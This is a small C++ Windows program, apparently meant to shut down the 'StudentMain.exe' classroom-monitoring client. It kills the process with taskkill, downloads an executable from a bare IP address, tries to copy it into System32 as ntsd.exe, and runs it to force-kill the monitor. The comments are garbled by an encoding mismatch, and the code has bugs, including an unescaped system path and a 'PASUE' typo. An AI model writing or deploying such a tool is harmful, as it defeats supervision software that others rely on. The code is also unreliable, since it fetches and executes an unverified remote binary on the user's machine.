/*
	Tobby����:�����˳��� 
*/
#include<bits/stdc++.h>
#include<windows.h>
#include<stdio.h>
#include<direct.h> 
#pragma comment(lib,"URlmon")

using namespace std; 
int main(){
	printf("--By Tobby--\n");
	printf("jiyu-easy-exiter-downloadtest\n");
	printf("�����˳�:\n");
	printf("����ʹ��taskkill:");
	system("taskkill /f /t /im StudentMain.exe"); 
	//taskkill����
	printf("����ʹ��ntsd:���������ļ�......\n");
	char buffer[MAX_PATH];
	_getcwd(buffer, MAX_PATH);
	strcat(buffer, "//ntsd.exe");//strcat_s
	HRESULT Result = URLDownloadToFileA(NULL, "http://49.234.94.97/", buffer, 0, NULL);
	switch (Result)
	{
	case S_OK:printf("�ɹ���ʼ����.\n");break;
	case E_OUTOFMEMORY: printf("����ʧ��!��ʹ�ñ���ntsd.exe.\n"); break;
	}
	char __temp[256] = "./ntsd.exe";
    char *sourcefile = __temp;
	//Դ�ļ�
    char *targetfile = "C:\Windows\System32\ntsd.exe";//Ŀ���ļ�
    CopyFile(sourcefile , targetfile , false);//false�����ǣ�true������
	//����NTSD�ļ�
	printf("�������:\n");
	system("ntsd -c q -pn StudentMain.exe");
	//ntsdǿ������
	printf("����ִ�����!");
	system("PASUE");
	return 0;
}
